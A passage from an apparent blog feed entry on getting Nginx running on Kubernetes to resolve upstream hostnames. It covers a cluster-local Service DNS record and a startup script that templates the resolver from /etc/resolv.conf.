-occurring with <code>sudo tcpdump -i lo -n dst port 53 | grep foo</code>.</p>
-
-<h2>What if that Nginx is also running on K8s?</h2>
-
-<h3>Problem</h3>
-
-<p>I had another Nginx instance that also made requests to foo. This Nginx was running on K8s too. It
-was created with this Deployment YAML.</p>
-
-<pre><code class="yaml">apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: nginx
-spec:
-  selector:
-    matchLabels:
-      app: nginx
-  template:
-    metadata:
-      labels:
-        app: nginx
-    spec:
-      containers:
-      - name: nginx
-        image: openresty/openresty:trusty
-        ports:
-          - name: https
-            containerPort: 443
-            protocol: TCP
-        volumeMounts:
-          - name: nginx-config
-            mountPath: /etc/nginx/conf.d
-      volumes:
-        - name: nginx-config
-          configMap:
-            name: nginx-config
-</code></pre>
-
-<p>The <code>nginx-config</code> ConfigMap was</p>
-
-<pre><code class="yaml">apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: nginx-config
-data:
-  nginx.conf: |
-    upstream foo {
-      server foo.example.com.:443;
-    }
-
-    server {
-      ...
-
-      # use regex capture to preserve url path and query params
-      location ~* /_foo/(.*) {
-        proxy_pass https://foo/$1;
-        ...
-      }
-    }
-</code></pre>
-
-<p>I replaced <code>upstream</code> with the same pattern above, but in this case when I needed to define
-<code>resolver</code> I couldn&rsquo;t use <code>127.0.0.1</code> because there&rsquo;s no Bind running locally. I can&rsquo;t hardcode the
-resolver because it might change.</p>
-
-<h3>Solution: run Nginx and foo on the same K8s cluster and use the cluster-local Service DNS record</h3>
-
-<p>If Nginx and foo run on the same K8s cluster, I can use the cluster-local DNS record created by a
-K8s Service matching the foo Pods. A Service like this</p>
-
-<pre><code class="yaml">apiVersion: v1
-kind: Service
-metadata:
-  name: foo
-  namespace: bar
-...
-</code></pre>
-
-<p>will create a DNS A record <code>foo.bar.svc.cluster.local.</code> pointing to the K8s Service&rsquo;s IP.
-Since this Service&rsquo;s IP is stable and it load balances requests to the underlying Pods, there&rsquo;s no need for Nginx to
-periodically lookup the Pod IPs. I can keep the <code>upstream</code> block like so.</p>
-
-<pre><code>upstream foo {
-  server foo.bar.svc.cluster.local.:443;
-}
-</code></pre>
-
-<p>As its name implies, <code>foo.bar.svc.cluster.local.</code> is only resolvable within the cluster. So
-Nginx has to be running on the same cluster as foo.</p>
-
-<h3>Solution: dynamically set the Nginx <code>resolver</code> equal to the system&rsquo;s when the Pod starts</h3>
-
-<p><strong>Disclaimer: This &ldquo;solution&rdquo; is more of an ugly, brittle hack that should only be used as a last
-resort.</strong></p>
-
-<p>What if Nginx is on another K8s cluster? Then I can set <code>resolver</code> to the IP of one of the
-nameservers in <code>/etc/resolv.conf</code>. After a bunch of tinkering I came up with this way to dynamically
-set the Nginx <code>resolver</code> when the Pod starts. A placeholder for <code>resolver</code> is set in the Nginx
-ConfigMap, and a command at Pod startup copies over the templated config and replaces the
-placeholder with a nameserver IP from <code>/etc/resolv.conf</code>.</p>
-
-<p>Change <code>nginx-config</code> ConfigMap to</p>
-
-<pre><code class="yaml">apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: nginx-config
-data:
-  nginx.conf.template: |
-    server {
-      ...
-
-      # This directive is dynamic because we set it to the
-      # kube-dns Service IP which is different for each cluster.
-      resolver $NAMESERVER;
-
-      set $foo_url foo.example.com.;
-
-      # use regex capture to preserve url path and query params
-      location ~* /_foo/(.*) {
-        proxy_pass https://$foo_url/$1;
-        ...
-      }
-    }
-</code></pre>
-
-<p>Deployment YAML then becomes (note the added <code>command</code>, <code>args</code>, and new <code>volume</code> and <code>volumeMount</code>).</p>
-
-<pre><code class="yaml">apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: nginx
-spec:
-  selector:
-    matchLabels:
-      app: nginx
-  template:
-    metadata:
-      labels:
-        app: nginx
-    spec:
-      containers:
-      - name: nginx
-        image: openresty/openresty:trusty
-        command: ['/bin/bash', '-c']
-        args:
-        - |
-          export NAMESERVER=$(grep 'nameserver' /etc/resolv.conf | awk '{print $2}' | tr '\n' ' ')
-          echo "Nameserver is: $NAMESERVER"
-          echo 'Copying nginx config'
-          envsubst '$NAMESERVER' &lt; /etc/nginx/conf.d.template/nginx.conf.template &gt; /etc/nginx/conf.d/nginx.conf
-          echo 'Using nginx config:'
-          cat /etc/nginx/conf.d/nginx.conf
-          echo 'Starting nginx'
-          nginx -g 'daemon off;'
-        ports:
-          - name: https
-            containerPort: 443
-            protocol: TCP
-        volumeMounts:
-          - name: nginx-config-template
-            mountPath: /etc/nginx/conf.d.template
-          - name: nginx-config
-            mountPath: /etc/nginx/conf.d
-      volumes:
-        - name: nginx-config
-          emptyDir: {}
-        - name: nginx-config-template
-          configMap:
-            name: nginx-config
-</code></pre>
-
-<p>A <code>volume</code> of type <code>emptyDir</code> is needed because recent versions of K8s made configMap volumes
-read-only. EmptyDir types are writable.</p>
-
-<p>Hopefully this helps some people out there who don&rsquo;t want to spend as much time as I did Googling
-obscure Nginx behavior.</p>
 ]]></content>
   </entry>
   
